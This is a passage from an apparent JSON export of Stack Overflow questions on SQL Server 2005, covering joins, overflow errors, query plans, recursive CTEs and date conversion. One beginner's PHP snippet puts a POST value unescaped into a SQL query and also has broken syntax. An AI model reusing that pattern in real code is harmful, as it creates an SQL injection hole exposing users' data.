_RecordsetPtr  rs;\n    CString strRequest;    \n\n    rs.CreateInstance(_T(\"ADODB.Recordset\"));\n    strRequest = _T(\"TRUNCATE TABLE dbo.table\");\n    rs-&gt;Open((LPCTSTR)strRequest,m_Connect.GetInterfacePtr(),adOpenStatic,adLockOptimistic,-1);\n    strRequest = _T(\"SELECT * FROM dbo.table\");\n    rs-&gt;Open((LPCTSTR)strRequest,m_Connect.GetInterfacePtr(),adOpenStatic,adLockOptimistic,-1);\n\n    if (rs-&gt;ADOEOF)\n    {\n           rs-&gt;AddNew();\n           rs-&gt;Fields-&gt;GetItem(_T(\"field\"))-&gt;Value = (USHORT)10;\n           rs-&gt;Update();\n\n            rs-&gt;MoveLast();\n            _variant_t v;\n            v = rs-&gt;Fields-&gt;GetItem(_T(\"id\"))-&gt;Value;\n            CString FieldID = v.bstrVal;        \n    }\n\n    rs-&gt;Close();\n</code></pre>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12101092,"title":"SQL Server Table Join issue","body":"<p>I am Trying to join three tables and I an getting cross rows data (Getting 6 rows instead of 3). I tried inner,left and right join same result. Could you please help me.</p>\n\n<p><strong>Table 1</strong></p>\n\n<pre><code>SELECT PATIENT,TDACTDATE,TDACTTIME,TDVALUE \nFROM NurDocumentedResults A \nWHERE (INTBASE = '400130') \n    AND (TDQUERY = 'NURPTVALUE') \n    AND (TDACTDATE = '20120425') \nAND TDVALUE &gt;='8.0' AND A.PATIENT='F126' \n</code></pre>\n\n<p>Result I am getting </p>\n\n<pre><code>F126    20120425    1715    8.8\nF126    20120425    1840    8.4\nF126    20120425    2300    9.7\n</code></pre>\n\n<p><strong>Table 2</strong></p>\n\n<pre><code>SELECT B.PATIENT,A.TESTRESULTDATE,A.TESTRESULTTIME,A.RESULT \nFROM LabLSpecResultTests A\nINNER JOIN LabLSpecimenFile B \n    ON A.URN=B.URN \n    AND A.TESTRESULTDATE=B.COLLECTIONDATE \nWHERE A.TESTRESULTDATE='20120425' \n    AND (A.TEST IN ('100.0100', '100.0120', '100.0130', '100.0110')) \n    AND (A.RESULT &gt; '8.0') \n    AND B.PATIENT='F126'\n</code></pre>\n\n<p>Result I am getting</p>\n\n<pre><code>F126    20120425    1756    8.5\nF126    20120425    2335    9.2\n</code></pre>\n\n<p><strong>When I join all three Tables,</strong> </p>\n\n<pre><code>SELECT D.PATIENT,TDACTDATE,TDACTTIME,TDVALUE,A.RESULT,A.RESULTTIME,A.TESTRESULTDATE,A.TESTRESULTTIME\nFROM NurDocumentedResults D \nLEFT OUTER JOIN LabLSpecimenFile B \n    ON D.PATIENT=B.PATIENT AND D.TDACTDATE=B.COLLECTIONDATE\nINNER JOIN LabLSpecResultTests A \n    ON A.URN=B.URN \n    AND A.TESTRESULTDATE=B.COLLECTIONDATE\nWHERE (INTBASE = '400130') \n    AND (TDQUERY = 'NURPTVALUE') \n    AND (TDACTDATE = '20120425') \n    AND TDVALUE &gt;='8.0' \n    AND A.TESTRESULTDATE='20120425' \n    AND  (A.TEST IN ('100.0100', '100.0120', '100.0130', '100.0110')) \n    AND (A.RESULT &gt; '8.0') \n    AND D.PATIENT='F126'\n</code></pre>\n\n<p><strong>I am getting following Result</strong></p>\n\n<pre><code>F126    20120425    1715    8.8 8.5 2463    20120425    1756\nF126    20120425    1840    8.4 8.5 2463    20120425    1756\nF126    20120425    2300    9.7 8.5 2463    20120425    1756\nF126    20120425    1715    8.8 9.2 22789   20120425    2335\nF126    20120425    1840    8.4 9.2 22789   20120425    2335\nF126    20120425    2300    9.7 9.2 22789   20120425    2335\n</code></pre>\n"},{"tags":["mysql","sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12098124,"title":"Taking IF clauses from MySQL to SQL Server 2005","body":"<p>How do I make this MySQL query into SQL Server equivalents?</p>\n\n<pre><code>SELECT User.id, User.first, User.last,\nIF (User.first = q1 OR User.first = q2, 1, 0) +\nIF (User.last = q1 OR User.last = q2, 1, 0) as points\nFROM users as User\nORDER BY points DESC\n</code></pre>\n"},{"tags":["sql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":174,"score":0,"question_id":12097859,"title":"SQL 8115 Arithmetic overflow error converting numeric to data type numeric","body":"<p>I obtain on my SQL Server 2005 an error</p>\n\n<pre><code>Server: Msg 8115, \nArithmetic overflow error converting numeric to data type numeric.\n</code></pre>\n\n<p>When I try to insert a value = <strong><code>X</code></strong>(DECIMAL(3,2)) * <strong><code>Y</code></strong>(INT)<br>\nin a column <code>MYCOLUMN</code> typed <code>DECIMAL (10,3)</code></p>\n\n<p>How to workaround this problem?</p>\n\n<p>UPDATE</p>\n\n<p>some code bellow to understand the situation</p>\n\n<pre><code>-- ============================================================\n--   Table : GP_WGENTH\n-- ============================================================\nCREATE TABLE #GP_WGENTH\n(\n     KEYINTERNAL                     CHAR(32)              NOT NULL,\n     KEYHOUR                         INT                   NOT NULL,\n     FIRM                            CHAR(5)               NOT NULL,\n     CENTRE                          CHAR(2)               NOT NULL,\n     SERVICE                         CHAR(6)               NOT NULL,\n     AGENT                           CHAR(5)               NOT NULL,\n     VERSION                         VARCHAR(3)            NOT NULL,\n     DATE_ROULEMENT                  DATETIME              NOT NULL,\n     SERVICEINSTANCE                 SMALLINT              NOT NULL,\n     TYPEHOUR                        CHAR(9)               NOT NULL,\n     QUANTITEFIXE                    DECIMAL(12,2)         NULL    ,\n     TYPECMP                         INT                   NULL    ,\n     PERCENTCALC                     DECIMAL(3,2)          NULL    \n)\n-- ============================================================\n--   Table : GP_WGENSVCTH\n-- ============================================================\nCREATE TABLE #GP_WGENSVCTH\n(\n    KEYINTERNAL                     CHAR(32)              NOT NULL,\n    KEYHOUR                         INT                   NOT NULL,\n    FIRM                            CHAR(5)               NOT NULL,\n    CENTRE                          CHAR(2)               NOT NULL,\n    SERVICE                         CHAR(6)               NOT NULL,\n    AGENT                           CHAR(5)               NOT NULL,\n    VERSION                         VARCHAR(3)            NOT NULL,\n    DATE_ROULEMENT                  DATETIME              NOT NULL,\n    SERVICEINSTANCE                 SMALLINT              NOT NULL,\n    TYPEHOUR                        CHAR(9)               NOT NULL,\n    VALUE                           DECIMAL(10,3)         NOT NULL\n)\nGO\n\nINSERT INTO #GP_WGENSVCTH \n            (KEYINTERNAL, \n             KEYHOUR, \n             FIRM, \n             CENTRE, \n             SERVICE, \n             AGENT, \n             VERSION, \n             DATE_ROULEMENT, \n             SERVICEINSTANCE, \n             TYPEHOUR, \n             VALUE) \nSELECT WTH.KEYINTERNAL, \n       WTH.KEYHOUR, \n       WTH.FIRM, \n       WTH.CENTRE, \n       WTH.SERVICE, \n       WTH.AGENT, \n       WTH.VERSION, \n       WTH.DATE_ROULEMENT, \n       WTH.SERVICEINSTANCE, \n       WTH.TYPEHOUR, \n       WTH.PERCENTCALC * SUM(SC.LENGTH) -- !!! BOOOM !!!!!!!!! HERE\nFROM   #GP_WGENTH WTH \n       INNER JOIN GP_SERVICE_HABILLAGE_COMPONENT SC \n               ON WTH.FIRM = SC.FIRM \n                  AND WTH.CENTRE = SC.CENTRE \n                  AND WTH.SERVICE = SC.SERVICE \n                  AND WTH.VERSION = SC.VERSION \n                  AND WTH.TYPECMP = SC.TYPECMP \nWHERE  WTH.KEYINTERNAL = 'august 23 2012  10:45:21:027PM     ' \n       AND SC.LENGTH IS NOT NULL \nGROUP  BY WTH.KEYINTERNAL, \n          WTH.KEYHOUR, \n          WTH.FIRM, \n          WTH.CENTRE, \n          WTH.SERVICE, \n          WTH.AGENT, \n          WTH.VERSION, \n          WTH.DATE_ROULEMENT, \n          WTH.SERVICEINSTANCE, \n          WTH.TYPEHOUR, \n          WTH.PERCENTCALC \n</code></pre>\n"},{"tags":["sql","sql-server-2005","max","varchar","string-concatenation"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":105,"score":1,"question_id":12097670,"title":"How to store a string var greater than varchar(max)? ","body":"<p>I'm trying to do this:</p>\n\n<pre><code>DECLARE @myVar VARCHAR(MAX)\nLoop with cursor\nselect @myVar = @myVar + bla bla bla\nend loop\n</code></pre>\n\n<p>When the loop ends, @myVar is incomplete, containing only 8000 characters.</p>\n\n<p>I have tryed to use text, but is not allowed to local vars.</p>\n\n<p>What would be a good solution to this case?  </p>\n\n<p>xml var?</p>\n\n<p>I have just looked this posts:</p>\n\n<p><a href=\"http://stackoverflow.com/questions/284610/how-do-i-pass-a-string-parameter-greater-than-varchar8000-in-sql-server-2000\">How do I pass a string parameter greater than varchar(8000) in SQL Server 2000?</a></p>\n\n<p><a href=\"http://stackoverflow.com/questions/2975165/check-if-concatenating-to-a-varcharmax-will-go-beyond-max-allowable-characters\">Check if concatenating to a varchar(max) will go beyond max allowable characters</a></p>\n\n<p>And others through the web.</p>\n\n<p>Regards.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":42,"score":-1,"question_id":12096824,"title":"Convert Any to String in SQL","body":"<p>I have to log some param values to a log file (SQL Server 2005)</p>\n\n<p>Is there an <em>universal</em> <strong><code>.ToString()</code></strong> method in SQL that could convert any kind of <code>object</code> to <code>string</code> in order to visualize a object value?</p>\n\n<p>by eg. if I use <code>STR(@param)</code> it expects that @param be an float or integer value. and it fails when the @param is a varchar...</p>\n"},{"tags":["sql-server-2005","web-applications","reporting-services","cross-browser"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":847,"score":1,"question_id":3143410,"title":"SQL Server 2005 Reporting Services: Reports are Compressed","body":"<p>I have a report that I am capable of viewing correctly in Internet Explorer (IE) with the help of Reports from SQL Server 2005 Report Server (SSRS). The problem is that the report is compressed to about 100px by 100px in Firefox and probably other browsers such as Safari and Chrome. Also, I am using IIS6.</p>\n\n<p>How can a report be rendered properly in browsers other than IE with SSRS?</p>\n"},{"tags":["sql-server-2008","query","sql-server-2005","database-deadlocks"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12056459,"title":"Queries locking up DB Server CPU","body":"<p>We are using MSSQL server 2008 and our application has sql queries which locks up the DB at Row and Page levels. It is been said that because of the locks the CPU hit is 100%. Is there a procedure or way to find out which instance of MSSQL server is consuming how much CPU, so that i can narrow down this issue further?</p>\n"},{"tags":["sql-server","tsql","sql-server-2005","join","sql-execution-plan"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":76,"score":3,"question_id":12093714,"title":"a query using covering index, merge join, hash join","body":"<p>I am tuning a query on SQL Server 2005.\nPlease note the real question is at the end. \nI have following query, both pto and ph has about 30million rows. The query initially run very slow (3 mins). So I added two index on pto, ph respectively.</p>\n\n<pre><code>        SELECT \n            MAX(ph.txn_date_time)\n        FROM \n            pto AS pto WITH (NOLOCK) \n            INNER JOIN ph AS ph WITH (NOLOCK) ON ph.receipt_id = pto.receipt_id\n        WHERE \n                pto.subtype = 'ff'\n            AND pto.Units_No &gt; 0\n            AND ph.branch_id = 5\n\n\n\nCREATE NONCLUSTERED INDEX [IX_pto_subTypeUnitReceipt] ON [dbo].[pto] \n(\n    [SUBTYPE] ASC,\n    [Units_No] ASC,\n    [RECEIPT_ID] ASC\n\n)WITH (SORT_IN_TEMPDB = OFF, DROP_EXISTING = ON, IGNORE_DUP_KEY = OFF, ONLINE = OFF) ON [Indexes]\n\n\nCREATE NONCLUSTERED INDEX [IX_ph_branchReceiptTxn] ON [dbo].[ph] \n(\n    [BRANCH_ID] ASC,\n    [RECEIPT_ID] ASC,\n    [TXN_DATE_TIME] ASC\n)WITH (SORT_IN_TEMPDB = OFF, DROP_EXISTING = OFF, IGNORE_DUP_KEY = OFF, ONLINE = OFF) ON [Indexes]\n</code></pre>\n\n<p>Now the query runs in 350ms. Great. The execution plan is also very simple, it uses the created index from the two tables and did a Hash join on the receipt_id column then a Stream Aggregate to do the MAX(ph.txn_date_time). So every column in the query is covered by the two added index. </p>\n\n<p>The question is why it used a Hash join on the receipt_id column? I mean since RECEIPT_ID in both indexes are sorted the optimizer should have used a merge join. To figure out why I changed the first index to below (put RECEIPT_ID before Units_No). </p>\n\n<pre><code>CREATE NONCLUSTERED INDEX [IX_pto_subTypeUnitReceipt] ON [dbo].[pto] \n(\n[SUBTYPE] ASC,\n[RECEIPT_ID] ASC,\n[Units_No] ASC\n\n\n)WITH (SORT_IN_TEMPDB = OFF, DROP_EXISTING = ON, IGNORE_DUP_KEY = OFF, ONLINE = OFF) ON [Indexes]\n</code></pre>\n\n<p>And now I see the Merge join on the RECEIPT_ID column. The query also runs in 170ms. Now obviously the optimizer think the RECEIPT_ID in both indexes are sorted so a merge join is used. But I don't understand why in the first case it doesn't think so?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","optimization"],"answer_count":3,"favorite_count":3,"up_vote_count":22,"down_vote_count":0,"view_count":7015,"score":22,"question_id":1395275,"title":"Which is better: Bookmark/Key Lookup or Index Scan","body":"<p>I know that an index <strong>seek</strong> is better than an index <strong>scan</strong>, but which is preferable in SQL Server explain plans: Index seek or Key Lookup (Bookmark in SQL Server 2000)?</p>\n\n<p>Please tell me they didn't change the name again for SQL Server 2008...</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":7,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":4999,"score":1,"question_id":2927475,"title":"sql server - select top and bottom rows","body":"<p>I'm using Sql Server 2005 and i'm trying to achieve something like:\nIn the same select statement i want to get the first x rows and the last x rows.</p>\n\n<pre><code>SELECT TOP(5) BOTTOM(5)\n</code></pre>\n\n<p>Of course 'bottom' does not exist so i need other solution.\nI believe there is an easy and elegant solution that i'm not getting.\nDoing the select again with Group By Desc is not an option.</p>\n\n<p>Thanks.</p>\n"},{"tags":["sql","sql-server-2005","user-defined-functions"],"answer_count":4,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":1468,"score":1,"question_id":2833389,"title":"Finding all Stored procedures calling a function","body":"<p>How can I find out all the stored procedures that are calling a particular user defined function in SQL Server 2005.</p>\n\n<p>Or how to assign a defult value to a parameter in a user defined function so that when a stored procedure calls that function and does not pass any value to that parameter function assumes the default value.</p>\n\n<p>Regards,\nAbhishek jain</p>\n"},{"tags":["sql","sql-server-2005","identity-column"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":512,"score":0,"question_id":2847789,"title":"Identity column SQL Server 2005 inserting same value twice","body":"<p>I have a stored procedure that inserts into a table (where there is an identity column that is not the primary key- the PK is inserted initially using the date/time to generate a unique value).</p>\n\n<p>We then use SCOPEIDENTITY() to get the value inserted, then there is some logic to generate the primary key field value based on this value, which is then updated back to the table.</p>\n\n<p>In some situations the stored procedure is called simultaneously by more than one process, resulting in \"Violation of PRIMARY KEY constraint...\" errors.</p>\n\n<p>This would seem to indicate that the identity column is allowing the same number to be inserted for more than one record.</p>\n\n<p>First question- how is this possible?</p>\n\n<p>Second question- how to stop it...there's no error handling currently so I'm going to add some try/ catch logic- but would like to understand the problem fully to deal with properly</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":104,"score":1,"question_id":3191947,"title":"How to obtain only ALL Undocumented Stored Procs in SQL SERVER 2005","body":"<p>If I write </p>\n\n<pre><code>SELECT * FROM sys.all_objects\nWHERE ([type] = 'P');\n</code></pre>\n\n<p>I will get all the SQL Stored Procedure. But how to obtain only the Undocumented ones?</p>\n\n<p>Thanks</p>\n"},{"tags":["sql","performance","tsql","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":67,"score":2,"question_id":12091019,"title":"WHERE in Sql, combining two fast conditions multiplies costs many times","body":"<p>I have a fairly complex sql that returns 2158 rows' id from a table with ~14M rows. I'm using CTEs for simplification. </p>\n\n<p>The <code>WHERE</code> consists of two conditions. If i comment out one of them, the other runs in ~2 second. If i leave them both (separated by <code>OR</code>) the query runs ~100 seconds. The first condition alone needs 1-2 seconds and returns 19 rows, the second condition alone needs 0 seconds and returns 2139 rows.</p>\n\n<p>What can be the reason?</p>\n\n<p>This is the complete SQL:</p>\n\n<pre><code>WITH fpcRepairs AS\n(\n    SELECT FPC_Row = ROW_NUMBER()OVER(PARTITION BY t.SSN_Number ORDER BY t.Received_Date, t.Claim_Creation_Date, t.Repair_Completion_Date, t.Claim_Submitted_Date)\n    ,   idData, Repair_Completion_Date, Received_Date, Work_Order, SSN_number, fiMaxActionCode, idModel,ModelName\n    ,   SP=(SELECT TOP 1 Reused_Indicator FROM tabDataDetail td INNER JOIN tabSparePart sp ON td.fiSparePart=sp.idSparePart\n            WHERE td.fiData=t.idData\n            AND (td.Material_Quantity &lt;&gt; 0) \n            AND (sp.SparePartName = '1254-3751'))\n    FROM   tabData AS t INNER JOIN\n       modModel AS m ON t.fiModel = m.idModel \n    WHERE (m.ModelName = 'LT26i') \n    AND EXISTS(\n        SELECT  NULL \n        FROM    tabDataDetail AS td \n        INNER JOIN tabSparePart AS sp ON td.fiSparePart = sp.idSparePart\n        WHERE  (td.fiData = t.idData) \n        AND (td.Material_Quantity &lt;&gt; 0) \n        AND (sp.SparePartName = '1254-3751')\n    ) \n), needToChange AS\n(\n    SELECT idData FROM tabData AS t INNER JOIN\n       modModel AS m ON t.fiModel = m.idModel\n    WHERE (m.ModelName = 'LT26i') \n    AND EXISTS(\n        SELECT  NULL \n        FROM    tabDataDetail AS td \n        INNER JOIN tabSparePart AS sp ON td.fiSparePart = sp.idSparePart\n        WHERE  (td.fiData = t.idData) \n        AND (td.Material_Quantity &lt;&gt; 0) \n        AND (sp.SparePartName IN ('1257-2741','1257-2742','1248-2338','1254-7035','1248-2345','1254-7042'))\n    ) \n)\nSELECT t.idData\nFROM tabData AS t INNER JOIN modModel AS m ON t.fiModel = m.idModel\nINNER JOIN needToChange ON t.idData = needToChange.idData  -- needs to change FpcAssy\nLEFT OUTER JOIN fpcRepairs rep ON t.idData = rep.idData\nWHERE   \nrep.idData IS NOT NULL          -- FpcAssy replaced, check if reused was claimed correctly\nAND rep.FPC_Row &gt; 1             -- other FpcAssy repair before\nAND (\n    SELECT SP FROM fpcRepairs lastRep\n    WHERE lastRep.SSN_Number = rep.SSN_Number\n    AND lastRep.FPC_Row = rep.FPC_Row - 1\n) = rep.SP                      -- same SP, must be rejected(reused+reused or new+new)\nOR      \nrep.idData IS NOT NULL          -- FpcAssy replaced, check if reused was claimed correctly\nAND rep.FPC_Row = 1             -- no other FpcAssy repair before\nAND rep.SP = 0                  -- not reused, must be rejected\norder by t.idData \n</code></pre>\n\n<p>Here's the execution plan:</p>\n\n<p>Download: <a href=\"http://www.filedropper.com/exeplanfpc\" rel=\"nofollow\">http://www.filedropper.com/exeplanfpc</a></p>\n"},{"tags":["regex","sql-server-2005","escaping","quoting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12091639,"title":"SQL lost in to escaping characters for INSERT statements","body":"<ul>\n<li>I am using Microsoft SQL <strong>2005</strong>. </li>\n<li>\"Someone\" gives me a list of <code>INSERT</code> \"pre-defined statements\" that I <strong>CANNOT modify outside SQL</strong> (e.g. using scripting languages like Python).</li>\n<li>Being the \"Someone\" I am having issues trying to <strong>escape quoting characters</strong> for fields of type <code>NVARCHAR</code>.</li>\n</ul>\n\n<p>Say for example I need to run the following SQL statement:</p>\n\n<pre><code>INSERT INTO TableX VALUES('John Doe's value') -- This is not working because of single quotes...\n</code></pre>\n\n<p>I need to find a way to transform that string to insert (<code>John Doe's value</code>) without using methods outside of SQL statements.</p>\n\n<p>I unsuccesfully tried something like the following statements, concatenating a single quote with a <code>REPLACE</code> function and another single quote:</p>\n\n<pre><code>INSERT INTO TableX VALUES('' + REPLACE('John Doe's value'), ''', '''' + '')\n</code></pre>\n\n<p>Or</p>\n\n<pre><code>INSERT INTO TableX VALUES('''''' + REPLACE(''''''John Doe's value'''''''), '''''', '''''''' + '''''')\n</code></pre>\n\n<p>In order to deal with escaping characters, but it is not working.</p>\n\n<p>I would prefer using functions or simple stuff like that rather than using stored procedures or more complex solutions.</p>\n"},{"tags":["tsql","sql-server-2005","datetime-format"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":916,"score":0,"question_id":10300647,"title":"How to convert a DateTime string to a DateTime in SQL Server","body":"<p>I have a DateTime varchar in this format: 2005-08-08T00:00:00+01:00.</p>\n\n<ol>\n<li>Does this format have a name? (it's not ISO8601. Is it RFC3339?)</li>\n<li>How can I convert it to a DateTime using Transact-Sql?</li>\n</ol>\n\n<p><strong>EDIT</strong>\nHere's a summary answer, cobbled together from others input:</p>\n\n<ol>\n<li>It <em>is</em> ISO8601 with a time offset from UTC. If it was UTC it would end with a 'Z' instead of '+01:00'.  <a href=\"http://en.wikipedia.org/wiki/ISO_8601#Time_offsets_from_UTC\" rel=\"nofollow\">wikipedia</a></li>\n<li><p>You can convert it to local time or to utc as follows:</p>\n\n<blockquote>\n  <p>DECLARE @d VARCHAR(25) SET @d = '2007-08-08T00:01:00+01:00' SET @d =\n  '2007-08-08T00:01:00-01:00' SET @d = '2007-08-08T00:01:00+05:30'</p>\n  \n  <p>SELECT @d as Input, CONVERT(DATETIME, LEFT(@d, 19), 126) AS LocalDate\n  , DATEADD(MINUTE  , -CAST((SUBSTRING(@d, 20, 1) + RIGHT(@d, 2)) AS\n  INT)  , DATEADD(HOUR \n         ,-CAST(SUBSTRING(@d, 20, 3) AS INT)\n         , CONVERT(DATETIME, LEFT(@d, 19), 126))) as UtcDate WHERE @d LIKE '<strong>_<em>-</strong>-</em>_T__:<strong>:</strong>[+-]<strong>:</strong>'</p>\n</blockquote></li>\n</ol>\n\n<p>Results:</p>\n\n<pre><code>Input                     LocalDate               UtcDate\n------------------------- ----------------------- -----------------------\n2007-08-08T00:01:00+01:00 2007-08-08 00:01:00.000 2007-08-07 23:01:00.000\n\n2007-08-08T00:01:00-01:00 2007-08-08 00:01:00.000 2007-08-08 01:01:00.000\n\n2007-08-08T00:01:00+05:30 2007-08-08 00:01:00.000 2007-08-07 18:31:00.000\n</code></pre>\n"},{"tags":["sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":142,"score":0,"question_id":3386322,"title":"Assigning a value to a variable in SQL exec","body":"<p>It's possible to assign a value to a variable returned from <code>exec @sql</code>?:</p>\n\n<pre><code>set @var= exec calculate 'param' are this true\n</code></pre>\n"},{"tags":["php","html","sql-server-2005","tcpdf"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":100,"score":0,"question_id":12070659,"title":"PHP: connecting to available remote db, retriving data from db and filling that data in an html form, and print form data as pdf","body":"<p>I have created an html form with over 20 fields and want to print data from the form a page or pdf for printout using php. </p>\n\n<p>But most of the field data is available in a sql server 2005 database already available to me. But I'm not able to access this database. And I need to access it. Once I access the database, I need to use data entered into my 'id' &amp; 'date' field to retrieve data from the db as that 'id' and 'date'.(Example Query: Select * from tablename where id=\"123\" and date=\"12/08/2012\" ;  or something like that) After that I need to push this data into their relevant fields in my html form. And once i click submit after all this is entered. I need it to display all this information as a table in the browser or as a pdf, so i can print it out. I read up on tcpdf but can't make head otr tail of it. Hope you can help.</p>\n\n<p>Can anyone help me with this? </p>\n\n<p>Keep in mind that I'm new to coding and php and databases. I have a little experience with html. But I'm not great with advanced stuff.</p>\n\n<p>I would love it if u could answer me with a sample program similar to mine with all the necessary elements. Thank You in advance! I hope I'm not asking for too much.</p>\n\n<pre><code>&lt;html xmlns=\"http://www.w3.org/1999/xhtml\"&gt;\n    &lt;head&gt;\n        &lt;title&gt;TEST PHP DB&lt;/title&gt;\n        &lt;?php\n        if (!isset($_POST=\"\"))\n        {\n            $mydb=\"OASIS\";\n            $conn=mssql_connect(\"Server\", \"admin\", \"password\") or die (\"Error in Connection\");\n            $select=mssql_select_db($mydb,$conn) or die(\"Couldn't connect to db\");\n\n            $pid=$_POST(\"ID\");        \n            $strSQL = \"SELECT [First Name] FROM [Data Table] where Patient='$pid'\";\n            $rs = mssql_query($strSQL);\n\n            while($row = mssql_fetch_array($rs)) \n            {\n                echo $row[\"First Name\"];\n            }\n\n            if (!$strSQL) \n            {\n                die('MSSQL error: ' . mssql_get_last_message());\n            }\n\n            mssql_close($conn);\n        }\n        ?&gt;\n    &lt;/head&gt;\n\n    &lt;body&gt;\n        &lt;form name=\"test\" method=\"POST\"&gt;\n            ID : &lt;input name=\"ID\" type=\"text\"&gt;\n            &lt;input type=\"submit\" value=\"Search\"&gt;\n            NAME : &lt;input name=\"FirstName\" type=\"text\"&gt;\n        &lt;/form&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":7197,"score":3,"question_id":472550,"title":"How to change the Auto Growth size? MS SQL Server 2005","body":"<p>In MS Sql server 2005, by default 1MB Auto Growth is there, How can i change it to whatever i need.?</p>\n\n<p>Thanx,\nAmbanna</p>\n"},{"tags":["database","sql-server-2005","backup"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1166,"score":1,"question_id":1179442,"title":"Verifying Full database backups \"WITH CHECKSUM\"","body":"<p>We have a daily maintenance plan in SQL Server 2005 that performs a full backup to disk using the \"Back Up Database Task\". </p>\n\n<p>\"Verify backup integrity\" is enabled but from what I understand data integrity is only validated if the backup media contains a checksum, which is enabled by the \"WITH CHECKSUM\" option during the backup. I can see from generated T-SQL that the maintenance plan task does not create this so, apart from manually hacking the command's code, how do we specify this in the task (if it is indeed possible)?</p>\n"},{"tags":["sql","sql-server-2005","common-table-expression","recursive-query"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":110,"score":0,"question_id":12081073,"title":"SQL Recursive CTE using two tables","body":"<p>I have two tables, one is a Product Customer mapping and another is a Product sharing table. Using SQL recursive CTE, given a product, I am trying to find all the products that are linked as a chain, mapped across the customers. In addition, if a Product is shared with another Product, I need to include it in the chain too. Hopefully, my example make more sense than the description</p>\n\n<pre><code>Product Customer Table\nProduct    Customer\n  Milk     Illinois\n  Milk     Michigan\n  Butter   Michigan\n  Cream    Wisconsin\n  Honey    Wisconsin\n  Cheese   Minnesota\n\nProduct Sharing Table\nProduct    SharedProduct\n Butter     Cream\n Cream      Cheese\n</code></pre>\n\n<p>For the above data, let's say my input Product is Milk, then the result set should include all the products - Milk, Butter, Cream, Honey &amp; Cheese. Here Butter-Cream &amp; Cream-Cheese are linked through the Product Sharing table.</p>\n\n<p>My current SQL looks like this but doesn't really work more than one level deep.</p>\n\n<pre><code>WITH Product_CTE AS\n(\n  SELECT DISTINCT [Product] FROM ProductCustomer\n  WHERE [Product] IN (SELECT DISTINCT p2.[Product]\n  FROM ProductCustomer p1 INNER JOIN ProductCustomer p2\n  ON p1.[Customer] = p2.[Customer] WHERE p1.[Product] = 'Milk')\n  UNION ALL\n  SELECT [SharedProduct] FROM ProductSharing b\n  INNER JOIN Product_CTE p ON p.[Product] = b.[Product]\n)\nSelect [Product] from Product_CTE\n</code></pre>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":41,"score":2,"question_id":12080074,"title":"Select on records based on two column criterias","body":"<p>I would like to do an SQL query to select from the following table:</p>\n\n<pre><code>id    type    num\n1     a       3\n1     b       4\n2     a       5\n2     c       6\n</code></pre>\n\n<p>In the case where they have the same 'id' and be type 'a or b', so the result would look something like this:</p>\n\n<pre><code>id    type    num\n1     a       3\n1     b       4\n</code></pre>\n\n<p>Any one has any idea how that can be accomplished?</p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":138,"score":1,"question_id":12074638,"title":"TSQL Internal Rate of Return (IRR) from row instead of columns","body":"<p>I have a data table like this:</p>\n\n<pre><code>Group   ID    M0    M1    ...    M20\n------------------------------------\n    1    1    10    -2    ...     54\n    1    2    -8    10    ...    -20\n    2    6   -10    12    ...      0\n    2    4    45    52    ...      0\n    2    5    12   102    ...      0\n</code></pre>\n\n<p>I'm grouping my data by Group like so:</p>\n\n<pre><code>SELECT Group\n     , round(sum(M0+M1+M2+...+M20)/count(ID),2) as profit\n     , round(sum(M0),2) as M0\n     , round(sum(M1),2) as M1\n     , ...\n     , round(sum(M20),2) as M20\nFROM\n    data_table\nGROUP BY\n    Group\n</code></pre>\n\n<p>What I need to add is IRR based on M0 to M20 columns.</p>\n\n<p>I found an IRR function that looks like this:</p>\n\n<pre><code>CREATE FUNCTION [dbo].[ufn_IRR]\n  (\n   @strIDs VARCHAR(8000),\n   @guess DECIMAL(30,10)\n  )\nRETURNS DECIMAL(30, 10)\nAS \n  BEGIN\n    DECLARE @t_IDs TABLE (\n        id INT IDENTITY(0, 1),\n        value DECIMAL(30, 10)\n    )\n    DECLARE @strID VARCHAR(12),@sepPos INT,@NPV DECIMAL(30, 10)\n    SET @strIDs = COALESCE(@strIDs + ',', '')\n    SET @sepPos = CHARINDEX(',', @strIDs)\n    WHILE @sepPos &gt; 0 \n      BEGIN\n        SET @strID = LEFT(@strIDs, @sepPos - 1)\n        INSERT INTO @t_IDs ( value ) SELECT ( CAST(@strID AS DECIMAL(20, 10)) ) WHERE ISNUMERIC(@strID) = 